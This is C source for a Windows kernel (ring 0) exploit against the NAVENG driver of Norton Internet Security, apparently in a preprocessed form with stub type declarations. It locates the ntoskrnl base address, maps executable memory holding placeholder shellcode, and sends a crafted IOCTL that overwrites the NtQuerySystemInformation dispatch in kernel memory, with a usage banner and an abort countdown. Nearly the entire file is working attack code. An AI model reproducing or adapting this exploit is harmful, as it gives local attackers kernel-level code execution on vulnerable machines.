
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int arrMods ;
typedef int Ring0ShellCode ;
typedef int (* PGETDEVNAME ) (int,char*,int) ;
typedef int (* PENUMDEVICES ) (int*,int,int*) ;
typedef int LPVOID ;
typedef scalar_t__ HANDLE ;
typedef int DWORD ;
typedef char CHAR ;
typedef int BOOL ;


 int CloseHandle (scalar_t__) ;
 scalar_t__ CreateFile (char*,int ,int ,int *,int,int ,int ) ;
 int DeviceIoControl (scalar_t__,int,int,int ,int,int,int*,int *) ;
 scalar_t__ GetProcAddress (int ,char*) ;
 scalar_t__ INVALID_HANDLE_VALUE ;
 int LoadLibrary (char*) ;
 int MAX_PATH ;
 int MEM_COMMIT ;
 int MEM_RESERVE ;
 int PAGE_EXECUTE_READWRITE ;
 int ShowError () ;
 int Sleep (int) ;
 scalar_t__ VirtualAlloc (int,int,int,int ) ;
 int W2K_SWITCH ;
 int WXP_SWITCH ;
 int exit (int) ;
 int free (int*) ;
 int memcpy (int,int,int) ;
 int printf (char*,...) ;
 scalar_t__ strncmp (char*,char*,int) ;
 int system (char*) ;

int main(int argc, char *argv[])
{

 DWORD *OutBuff,*InBuff,*ShellAddr;
 DWORD dwIOCTL,OutSize,InSize,junk,cb,devNum,i,Ring0Addr;
 HANDLE hDevice;
 PENUMDEVICES pEnumDeviceDrivers;
 PGETDEVNAME pGetDeviceDriverBaseName;
 LPVOID arrMods[200],addEx;
 DWORD BaseNt=0,BaseAuxNt;
 BOOL InXP;
 CHAR baseName[MAX_PATH];


 unsigned char Ring0ShellCode[]="\xcc\x90\x90\x90";

  system("cls");

  printf("\n################################\n");
  printf("## Norton I.S                 ##\n");
  printf("## Ring0 Exploit              ##\n");
  printf("################################\n");
  printf("\nRuben Santamarta\nwww.reversemode.com\n\n");

 if(argc<2)
 {


  printf("\nusage> exploit.exe <XP> or <2K>\n");
  exit(1);
 }


 pEnumDeviceDrivers=(PENUMDEVICES)GetProcAddress(LoadLibrary("psapi.dll"),
             "EnumDeviceDrivers");

 pGetDeviceDriverBaseName=(PGETDEVNAME)GetProcAddress(LoadLibrary("psapi.dll"),
             "GetDeviceDriverBaseNameA");

 pEnumDeviceDrivers(arrMods,sizeof(arrMods),&cb);
 devNum=cb/sizeof(LPVOID);
 printf("\n[!] Searching Ntoskrnl.exe Base Address...");

 for(i=0;i<=devNum;i++)
 {
       pGetDeviceDriverBaseName(arrMods[i],baseName,MAX_PATH);
    if((strncmp(baseName,"ntoskr",6)==0))
    {
       printf("[%x] Found!\n",arrMods[i]);
     BaseNt = (DWORD)arrMods[i];
     BaseAuxNt = BaseNt;
    }
 }

if (!BaseNt)
{
   printf("!!? ntoskrnl.exe base address not found\nexiting\n\n");
   exit(0);
}






hDevice = CreateFile("\\\\.\\NAVENG",
                     0,
                     0,
                     ((void*)0),
                     3,
                     0,
                     0);




 if (hDevice == INVALID_HANDLE_VALUE) ShowError();

 printf("\n\n** Initializing Exploit]\n\n");
 printf("INFORMATION \n");
 printf("-----------------------------------------------------\n");
 printf("[!] NAVENG Device Handle [%x]\n",hDevice);







 OutSize = 4;
 dwIOCTL = 0x222AD3;


 if(strncmp(argv[1],"XP",2)==0) Ring0Addr = BaseNt + WXP_SWITCH;
 else Ring0Addr = BaseNt + W2K_SWITCH;

 printf("[!] Overwriting NtQuerySystemInformation Switch at [0x%x]\n",Ring0Addr);

 ShellAddr=(DWORD*)VirtualAlloc((LPVOID)0x2000000
                                ,0xF000
                                ,MEM_COMMIT|MEM_RESERVE
                                ,PAGE_EXECUTE_READWRITE);


 for(i=1;i<0x3C00;i++) ShellAddr[i]=(DWORD)ShellAddr;
 memcpy((LPVOID)ShellAddr,(LPVOID)Ring0ShellCode,sizeof(Ring0ShellCode));

 printf("\n\n\t\t[!] Initializing Countdown,last chance to abort.");

 for(i=10;i>=1;i--)
 {
   printf("\r -[ %d ]- ",i);
   if(i==1) printf("\n\n[*] Executing ShellCode");
   Sleep(1000);
 }

 DeviceIoControl(hDevice,
                 dwIOCTL,
                 (LPVOID)0,0,
                 (LPVOID)Ring0Addr,OutSize,
                 &junk,
                 ((void*)0));

 system("dir");





 CloseHandle(hDevice);
 free(ShellAddr);

 printf("\n\n[*] Exploit terminated\n\n");
 return 0;
}
